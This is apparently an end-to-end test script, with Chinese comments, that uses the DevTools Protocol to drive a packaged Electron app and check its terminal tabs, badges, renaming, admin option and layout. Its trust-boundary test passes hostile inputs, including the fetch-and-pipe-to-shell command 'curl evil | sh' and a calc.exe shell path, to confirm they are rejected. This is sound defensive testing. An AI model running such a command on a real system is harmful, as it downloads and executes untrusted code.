/**
 * 打包版 CDP 驗證：終端機分頁。
 *
 * 為什麼要打包版：node-pty 的 ConPTY 帶著自己的 `conpty.dll` 與 `OpenConsole.exe`，
 * asar 裡的 .exe 是不能執行的——asarUnpack 有沒有設對，只有打包版看得出來。
 *
 * 測完會把自己建立的工作階段刪掉，不留在你的 terminals.json 裡。
 *
 * 用法：node scripts/e2e-terminal-cdp.js
 */
const { spawn, execFileSync } = require('child_process')
const path = require('path')
const http = require('http')
const os = require('os')
const fs = require('fs')

const PORT = 9247
// Windows 偶爾會有別的東西鎖住 dist/win-unpacked（打包失敗、防毒掃描中），
// 這時可以打包到別的資料夾再用 VOICEINK_EXE 指過去，測試不必等鎖放掉
const EXE = process.env.VOICEINK_EXE || path.join(__dirname, '..', 'dist', 'win-unpacked', 'VoiceInk.exe')
const USER_DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'voiceink-e2e-terminal-'))
fs.writeFileSync(path.join(USER_DATA_DIR, 'config.json'), JSON.stringify({ sysmonSensors: false }))

const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

function getJson(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let d = ''
      res.on('data', (c) => (d += c))
      res.on('end', () => {
        try { resolve(JSON.parse(d)) } catch (e) { reject(e) }
      })
    }).on('error', reject)
  })
}

class Cdp {
  constructor(wsUrl) {
    this.wsUrl = wsUrl
    this.ws = null
    this.id = 0
    this.pending = new Map()
  }
  async connect() {
    this.ws = new globalThis.WebSocket(this.wsUrl)
    await new Promise((res, rej) => {
      this.ws.addEventListener('open', res)
      this.ws.addEventListener('error', rej)
    })
    this.ws.addEventListener('message', (ev) => {
      const msg = JSON.parse(ev.data)
      if (msg.id && this.pending.has(msg.id)) {
        const { resolve, reject } = this.pending.get(msg.id)
        this.pending.delete(msg.id)
        if (msg.error) reject(new Error(msg.error.message))
        else resolve(msg.result)
      }
    })
    this.ws.addEventListener('close', () => {
      for (const { reject } of this.pending.values()) reject(new Error('CDP 連線已關閉'))
      this.pending.clear()
    })
  }
  send(method, params = {}) {
    const id = ++this.id
    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject })
      this.ws.send(JSON.stringify({ id, method, params }))
    })
  }
  async eval(expression) {
    const r = await this.send('Runtime.evaluate', {
      expression, awaitPromise: true, returnByValue: true
    })
    if (r.exceptionDetails) {
      const d = r.exceptionDetails
      throw new Error(d.exception?.description || d.exception?.value || d.text || 'eval error')
    }
    return r.result?.value
  }
  close() { try { this.ws.close() } catch { /* 已斷線 */ } }
}

async function waitTargets(timeoutMs = 30000) {
  const start = Date.now()
  while (Date.now() - start < timeoutMs) {
    try {
      const list = await getJson(`http://127.0.0.1:${PORT}/json/list`)
      const pages = list.filter((t) => t.type === 'page')
      if (pages.length) return pages
    } catch { /* 還沒起來 */ }
    await sleep(400)
  }
  throw new Error('timeout waiting for CDP targets')
}

function stopTestApp(child) {
  if (!child?.pid) return
  try {
    execFileSync('taskkill', ['/PID', String(child.pid), '/T', '/F'], { stdio: 'ignore' })
  } catch { /* 程序已結束 */ }
}

/**
 * 在頁面裡等一個條件成立。
 * @param {Cdp} cdp
 * @param {string} expression 回傳布林的表達式
 */
async function waitInPage(cdp, expression, timeoutMs = 20000) {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    if (await cdp.eval(`(() => { try { return !!(${expression}) } catch { return false } })()`)) return true
    await sleep(300)
  }
  return false
}

async function main() {
  const results = []
  const ok = (name, pass, detail = '') => {
    results.push({ name, pass: !!pass })
    console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? ' — ' + detail : ''}`)
  }

  const child = spawn(EXE, [
    `--remote-debugging-port=${PORT}`,
    `--user-data-dir=${USER_DATA_DIR}`,
    '--hidden',
    '--disable-backgrounding-occluded-windows'
  ], { stdio: 'ignore' })
  /** 測試自己建立的工作階段 id，收尾要刪掉（兩個都要，中途失敗才不會留下垃圾） */
  let createdId = ''
  let secondId = ''
  /** 管理員那一列（只建立不開啟，不會跳 UAC） */
  let adminId = ''
  let cdp = null

  try {
    const pages = await waitTargets()
    // 指名主視窗：語音輸入開著時還會有一扇指示器視窗
    const mainPage = pages.find((p) => /index\.html/i.test(p.url)) || pages[0]
    cdp = new Cdp(mainPage.webSocketDebuggerUrl)
    await cdp.connect()
    await cdp.send('Runtime.enable')
    await sleep(1200)

    // 只縮小本測試建立的暫存 App，不碰使用者正在使用的安裝版。
    await cdp.eval('window.electronAPI.window.minimize()')
    ok('測試視窗在背景狀態啟動', await waitInPage(cdp, 'document.hidden === true'),
      await cdp.eval('String(document.hidden)'))
    await cdp.eval(`(async () => {
  const { Terminal } = await import('../../node_modules/@xterm/xterm/lib/xterm.mjs')
      const originalWrite = Terminal.prototype.write
      window.__termAsyncWrites = 0
      Terminal.prototype.write = function (...args) {
        window.__termAsyncWrites += 1
        return originalWrite.apply(this, args)
      }
    })()`)

    // ===== 分頁本身 =====
    const nav = await cdp.eval(`(() => ({
      order: [...document.querySelectorAll('.nav-tab')].map((b) => b.dataset.page),
      newBtn: !!document.getElementById('wsNewBtn'),
      // 側欄只剩專案：終端機清單與那顆「＋ 終端機」都收進分頁列的「＋」了
      termList: !!document.getElementById('termList'),
      termNewBtn: !!document.getElementById('termNewBtn')
    }))()`)
    // 終端機已併入聊天頁：nav 不再有 terminal 分頁，終端機在主區的分頁列上
    ok('nav 九個分頁、聊天排第一、沒有 terminal 分頁',
      nav.order.length === 9 && nav.order[0] === 'chat' && !nav.order.includes('terminal'), JSON.stringify(nav.order))
    ok('分頁列有「＋」按鈕', nav.newBtn)
    ok('側欄沒有終端機清單，也沒有「＋ 終端機」', !nav.termList && !nav.termNewBtn, JSON.stringify(nav))

    await cdp.eval(`document.querySelector('.nav-tab[data-page="chat"]').click()`)
    ok('聊天與終端機同一頁', await waitInPage(cdp, `document.getElementById('page-chat').classList.contains('active')`))
    ok('模組載入完成（分頁列畫出來了）',
      await waitInPage(cdp, `!!document.getElementById('wsTabStrip')`))
    ok('沒有 renderer 例外（xterm 的 ESM 從 node_modules 載得起來）',
      await cdp.eval(`typeof window.__termLoadError === 'undefined'`))

    // ===== 新終端機（走分頁列的「＋」）=====
    const shells = await cdp.eval(`(async () => {
      document.getElementById('wsNewBtn').click()
      await new Promise((r) => setTimeout(r, 300))
      const labels = [...document.querySelectorAll('.ws-new-item')].map((b) => b.textContent)
      const hasAdmin = !!document.getElementById('wsNewAdmin')
      document.getElementById('wsNewCustomTerm').click()
      await new Promise((r) => setTimeout(r, 400))
      const dialog = document.getElementById('termNewDialog')
      return {
        labels,
        hasAdmin,
        open: dialog.open,
        shells: [...document.getElementById('termShellSelect').options].map((o) => o.value),
        presets: [...document.getElementById('termPresetSelect').options].map((o) => o.value)
      }
    })()`)
    ok('「＋」選單有終端機與各家 CLI，還有管理員勾選',
      shells.labels.includes('終端機') && shells.labels.includes('Claude Code') && shells.hasAdmin,
      JSON.stringify(shells.labels))
    ok('「＋」的「終端機（自訂…）」打得開新終端機彈窗', shells.open)
    ok('shell 選單有三種', shells.shells.length === 3, JSON.stringify(shells.shells))
    ok('啟動指令有 claude／codex', shells.presets.includes('claude') && shells.presets.includes('codex'),
      JSON.stringify(shells.presets))

    const created = await cdp.eval(`(async () => {
      document.getElementById('termNewCreateBtn').click()
      await new Promise((r) => setTimeout(r, 2500))
      const list = await window.electronAPI.terminal.list()
      const item = list.data[list.data.length - 1]
      return {
        id: item.id,
        title: item.title,
        state: item.state,
        dialogClosed: !document.getElementById('termNewDialog').open,
        hostVisible: !document.getElementById('termHost').classList.contains('hidden'),
        panes: document.querySelectorAll('.term-pane').length,
        rows: document.querySelectorAll('.xterm-rows').length
      }
    })()`)
    createdId = created.id
    ok('建立後彈窗關閉、畫布顯示', created.dialogClosed && created.hostVisible, JSON.stringify(created))
    ok('xterm 真的掛上去了', created.panes === 1 && created.rows === 1, JSON.stringify(created))

    // 回歸：背景頁的 DOM 不會繪製 xterm；確認 prompt 已到 main buffer，且 renderer
    // 沒走會被背景 timer 節流的非同步 write。舊版在這裡會至少呼叫一次 write。
    const firstOutput = await cdp.eval(`(async () => {
      for (let i = 0; i < 25; i += 1) {
        const result = await window.electronAPI.terminal.open(${JSON.stringify(createdId)}, 80, 24)
        const buffer = result?.data?.buffer || ''
        if (buffer.trim().length > 3) return { buffer: buffer.slice(0, 80), asyncWrites: window.__termAsyncWrites }
        await new Promise((r) => setTimeout(r, 200))
      }
      return { buffer: '', asyncWrites: window.__termAsyncWrites }
    })()`)
    ok('背景首段 PTY 輸出不依賴非同步 write',
      firstOutput.buffer.trim().length > 3 && firstOutput.asyncWrites === 0,
      JSON.stringify(firstOutput))

    // ===== 狀態徽章 =====
    // shell integration 的第一個標記要先落地，再送指令才判得準
    await sleep(2000)
    await cdp.eval(`window.electronAPI.terminal.write(${JSON.stringify(createdId)}, 'ping -n 5 127.0.0.1\\r')`)
    ok('送出指令後分頁的狀態燈變成「運行中」', await waitInPage(
      cdp,
      `document.querySelector('.ws-tab.is-active .ws-tab-state')?.classList.contains('ws-tab-state-running') === true`,
      6000
    ), await cdp.eval(`document.querySelector('.ws-tab.is-active .ws-tab-open')?.title || '(無)'`))

    ok('跑完變成「已完成」', await waitInPage(
      cdp,
      `document.querySelector('.ws-tab.is-active .ws-tab-open').title.includes('已完成')`,
      20000
    ), await cdp.eval(`document.querySelector('.ws-tab.is-active .ws-tab-open')?.title || '(無)'`))

    // ===== 未讀點之一：人在別的主區（對話）時跑完 =====
    // 合頁後沒有「別的分頁」：切到某個對話＝使用者離開終端機主區。
    // 這個 user-data-dir 是全新的，側欄本來沒有對話，得自己開一個（用完刪掉）。
    // 注意：終端機列也帶 `.chat-list-item`，選擇器一定要限定在 `#chatList` 裡面。
    const away = await cdp.eval(`(async () => {
      document.getElementById('chatNewBtn').click()
      await new Promise((r) => setTimeout(r, 900))
      const row = document.querySelector('#chatList .chat-list-item')
      const chatId = row?.dataset.id || ''
      row?.querySelector('.chat-list-open')?.click()
      await new Promise((r) => setTimeout(r, 500))
      const leftTerminal = document.getElementById('termMain').classList.contains('hidden')
      await window.electronAPI.terminal.write(${JSON.stringify(createdId)}, 'echo away\\r')
      await new Promise((r) => setTimeout(r, 3500))
      const dots = document.querySelectorAll('.ws-tab-unread').length
      // 點分頁回到終端機主區（同時清掉未讀點）
      document.querySelector('.ws-tab[data-id="${createdId}"] .ws-tab-open').click()
      await new Promise((r) => setTimeout(r, 800))
      await window.electronAPI.chat.delete(chatId)
      return { chatId, leftTerminal, dots, after: document.querySelectorAll('.ws-tab-unread').length }
    })()`)
    ok('人在對話主區時跑完也會亮未讀點',
      away.leftTerminal && away.dots > 0 && away.after === 0, JSON.stringify(away))

    // ===== 未讀點之二：另一個階段跑完，而使用者正在看的是這一個 =====
    // 這是「哪個代理做完了」的核心提示，要真的開第二個階段才測得到。
    const second = await cdp.eval(`(async () => {
      // 走 UI 開第二個（renderer 的清單才會同步），開完再切回第一個當作「正在看的那個」
      document.getElementById('wsNewBtn').click()
      await new Promise((r) => setTimeout(r, 300))
      document.getElementById('wsNewCustomTerm').click()
      await new Promise((r) => setTimeout(r, 400))
      document.getElementById('termNewCreateBtn').click()
      await new Promise((r) => setTimeout(r, 3000))
      const list = await window.electronAPI.terminal.list()
      const id = list.data[list.data.length - 1].id
      // 一律指名自己建的那個，不要抓「第一個分頁」：使用者本來就有的工作階段會排在前面
      document.querySelector('.ws-tab[data-id="${createdId}"] .ws-tab-open').click()
      await new Promise((r) => setTimeout(r, 600))
      return id
    })()`)
    secondId = second
    await cdp.eval(`window.electronAPI.terminal.write(${JSON.stringify(second)}, 'ping -n 4 127.0.0.1\\r')`)
    ok('背景階段跑完會在分頁上亮未讀點', await waitInPage(
      cdp,
      `[...document.querySelectorAll('.ws-tab')]
         .filter((el) => !el.classList.contains('is-active'))
         .some((el) => el.querySelector('.ws-tab-unread'))`,
      20000
    ), await cdp.eval(`document.querySelectorAll('.ws-tab-unread').length + ' 個未讀點'`))

    ok('點開那個分頁就把未讀點清掉', await cdp.eval(`(async () => {
      const el = [...document.querySelectorAll('.ws-tab')]
        .find((node) => node.querySelector('.ws-tab-unread'))
      if (!el) return false
      el.querySelector('.ws-tab-open').click()
      await new Promise((r) => setTimeout(r, 900))
      return document.querySelectorAll('.ws-tab-unread').length === 0
    })()`))

    // 排序改成分頁列拖曳（回歸在 e2e-workspace-cdp 的 [L]），這裡不再測側欄。

    // 第二個階段用完了，走分頁的 × 刪掉（畫布也要跟著收），再把第一個切回來
    const cleaned = await cdp.eval(`(async () => {
      const el = document.querySelector('.ws-tab[data-id="${second}"]')
      if (!el) return { found: false }
      const close = el.querySelector('.ws-tab-close')
      close.click()
      await new Promise((r) => setTimeout(r, 200))
      close.click()
      await new Promise((r) => setTimeout(r, 1500))
      document.querySelector('.ws-tab[data-id="${createdId}"] .ws-tab-open')?.click()
      await new Promise((r) => setTimeout(r, 800))
      return {
        found: true,
        secondPane: !!document.querySelector('.term-pane[data-id="${second}"]'),
        secondTab: !!document.querySelector('.ws-tab[data-id="${second}"]'),
        firstPane: !!document.querySelector('.term-pane[data-id="${createdId}"]'),
        err: document.getElementById('termError')?.textContent || '',
        listAfter: (await window.electronAPI.terminal.list()).data.map((s) => s.id)
      }
    })()`)
    ok('關掉背景分頁後工作階段與畫布一起收乾淨',
      cleaned.found && !cleaned.secondPane && !cleaned.secondTab && cleaned.firstPane &&
      !cleaned.listAfter.includes(second), JSON.stringify(cleaned))
    secondId = ''

    // ===== 切走再切回來，畫面還在 =====
    const kept = await cdp.eval(`(async () => {
      const rows = () => document.querySelector('.term-pane[data-id="${createdId}"] .xterm-rows')
      const before = rows().textContent.length
      document.querySelector('.nav-tab[data-page="usage"]').click()
      await new Promise((r) => setTimeout(r, 500))
      // 終端機跟聊天同頁：點分頁切回終端機主區
      document.querySelector('.nav-tab[data-page="chat"]').click()
      await new Promise((r) => setTimeout(r, 400))
      document.querySelector('.ws-tab[data-id="${createdId}"] .ws-tab-open')?.click()
      await new Promise((r) => setTimeout(r, 600))
      const pane = document.querySelector('.term-pane[data-id="${createdId}"]')
      return { before, after: rows().textContent.length, active: pane.classList.contains('is-active') }
    })()`)
    ok('切走再切回來畫面沒被重畫', kept.after >= kept.before && kept.active, JSON.stringify(kept))

    // ===== 改名（分頁右鍵 → 就地改名）=====
    const renamed = await cdp.eval(`(async () => {
      const sel = '.ws-tab[data-id="${createdId}"]'
      const item = document.querySelector(sel)
      const rect = item.getBoundingClientRect()
      item.dispatchEvent(new MouseEvent('contextmenu', {
        bubbles: true, clientX: rect.left + 10, clientY: rect.top + 10
      }))
      await new Promise((r) => setTimeout(r, 200))
      const entry = [...document.querySelectorAll('.ws-menu-item')].find((b) => b.textContent === '重新命名')
      if (!entry) return { ok: false, menu: [...document.querySelectorAll('.ws-menu-item')].map((b) => b.textContent) }
      entry.click()
      await new Promise((r) => setTimeout(r, 200))
      const input = document.querySelector(sel + ' .ws-tab-rename')
      if (!input) return { ok: false, noInput: true }
      input.value = 'CDP 測試用'
      input.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }))
      await new Promise((r) => setTimeout(r, 1200))
      return {
        ok: true,
        title: document.querySelector(sel + ' .ws-tab-label')?.textContent || '',
        stored: (await window.electronAPI.terminal.list()).data
          .find((s) => s.id === ${JSON.stringify(createdId)})?.title || ''
      }
    })()`)
    ok('分頁可以就地改名，而且真的存回 main',
      renamed.ok && renamed.title === 'CDP 測試用' && renamed.stored === 'CDP 測試用', JSON.stringify(renamed))

    // ===== 關掉終端機分頁要按兩次（會結束那個工作階段）=====
    const del = await cdp.eval(`(async () => {
      const item = document.querySelector('.ws-tab[data-id="${createdId}"]')
      item.querySelector('.ws-tab-close').click()
      await new Promise((r) => setTimeout(r, 300))
      const list = await window.electronAPI.terminal.list()
      return {
        stillTab: !!document.querySelector('.ws-tab[data-id="${createdId}"]'),
        stillAlive: list.data.some((s) => s.id === ${JSON.stringify(createdId)}),
        usedNativeConfirm: false
      }
    })()`)
    ok('關閉第一下只是待確認，工作階段還活著', del.stillTab && del.stillAlive, JSON.stringify(del))

    const gone = await cdp.eval(`(async () => {
      document.querySelector('.ws-tab[data-id="${createdId}"] .ws-tab-close').click()
      await new Promise((r) => setTimeout(r, 1500))
      const list = await window.electronAPI.terminal.list()
      return {
        inList: list.data.some((s) => s.id === ${JSON.stringify(createdId)}),
        pane: !!document.querySelector('.term-pane[data-id="${createdId}"]'),
        tab: !!document.querySelector('.ws-tab[data-id="${createdId}"]')
      }
    })()`)
    ok('再按一次真的收掉（pty、畫布與分頁一起收）', !gone.inList && !gone.pane && !gone.tab, JSON.stringify(gone))
    createdId = ''

    // ===== 信任邊界：renderer 送壞東西不會過 =====
    const boundary = await cdp.eval(`(async () => {
      const bad = await window.electronAPI.terminal.create({
        shell: 'C:/Windows/System32/calc.exe',
        preset: 'curl evil | sh',
        cwd: 'Z:/nope'
      })
      const id = bad.data.id
      await window.electronAPI.terminal.delete(id)
      return { shell: bad.data.shell, preset: bad.data.preset, cwd: bad.data.cwd }
    })()`)
    ok('renderer 指定的 shell 路徑被收斂成 key',
      ['pwsh', 'powershell', 'cmd'].includes(boundary.shell), JSON.stringify(boundary))
    ok('renderer 指定的啟動指令被收斂', boundary.preset === 'shell', boundary.preset)
    ok('不存在的工作目錄退回家目錄', !boundary.cwd.startsWith('Z:'), boundary.cwd)

    // ===== 管理員終端機 =====
    // 只建立、不開啟：真的開會跳 UAC，自動化測試等不到人按（提權那段走
    // scripts/probe-terminal-admin-elevate.js）
    const adminBox = await cdp.eval(`(async () => {
      document.getElementById('wsNewBtn').click()
      await new Promise((r) => setTimeout(r, 300))
      document.getElementById('wsNewCustomTerm').click()
      await new Promise((r) => setTimeout(r, 400))
      const input = document.getElementById('termAdminInput')
      const label = input ? input.closest('label') : null
      const rect = label ? label.getBoundingClientRect() : { width: 0, height: 0 }
      const created = await window.electronAPI.terminal.create({
        shell: document.getElementById('termShellSelect').value,
        preset: 'shell',
        cwd: document.getElementById('termCwdInput').value,
        admin: true
      })
      document.getElementById('termNewCancelBtn').click()
      return {
        w: rect.width,
        h: rect.height,
        checkedByDefault: input ? input.checked : null,
        id: created.data.id,
        admin: created.data.admin
      }
    })()`)
    adminId = adminBox.id || ''
    ok('新終端機彈窗有「以系統管理員身分執行」且量得到尺寸',
      adminBox.w > 0 && adminBox.h > 0, JSON.stringify(adminBox))
    ok('管理員預設不勾', adminBox.checkedByDefault === false)
    ok('admin 有存進 terminals.json', adminBox.admin === true)

    // 「＋」選單裡的管理員勾選也要在（那是提權終端機唯一的入口）
    const adminInMenu = await cdp.eval(`(async () => {
      document.getElementById('wsNewBtn').click()
      await new Promise((r) => setTimeout(r, 300))
      const input = document.getElementById('wsNewAdmin')
      const label = input ? input.closest('label') : null
      const rect = label ? label.getBoundingClientRect() : { width: 0, height: 0 }
      const result = { found: !!input, checked: input ? input.checked : null, w: rect.width, h: rect.height }
      document.getElementById('wsNewBtn').click()
      return result
    })()`)
    ok('分頁列的「＋」選單有「以系統管理員身分執行」且量得到尺寸',
      adminInMenu.found && adminInMenu.checked === false && adminInMenu.w > 0 && adminInMenu.h > 0,
      JSON.stringify(adminInMenu))

    // ===== RWD =====
    for (const width of [1440, 900, 560]) {
      await cdp.send('Emulation.setDeviceMetricsOverride', {
        width, height: 900, deviceScaleFactor: 1, mobile: false
      })
      await sleep(500)
      const overflow = await cdp.eval(
        `document.documentElement.scrollWidth > document.documentElement.clientWidth`
      )
      ok(`${width}px 不橫向溢出`, !overflow)
    }
    await cdp.send('Emulation.clearDeviceMetricsOverride')
  } catch (error) {
    ok('測試流程未拋例外', false, error.message)
  } finally {
    for (const id of [createdId, secondId, adminId].filter(Boolean)) {
      if (!cdp) break
      try {
        await cdp.eval(`window.electronAPI.terminal.delete(${JSON.stringify(id)})`)
        console.log(`（已清掉測試建立的工作階段 ${id}）`)
      } catch { /* App 可能已經關了 */ }
    }
    cdp?.close()
    stopTestApp(child)
    try { fs.rmSync(USER_DATA_DIR, { recursive: true, force: true }) } catch { /* 程序剛結束，稍後由系統清理 */ }
  }

  const failed = results.filter((r) => !r.pass)
  console.log(`\n${results.length - failed.length} passed, ${failed.length} failed`)
  process.exit(failed.length === 0 ? 0 : 1)
}

main().catch((error) => {
  console.error(error)
  process.exit(1)
})
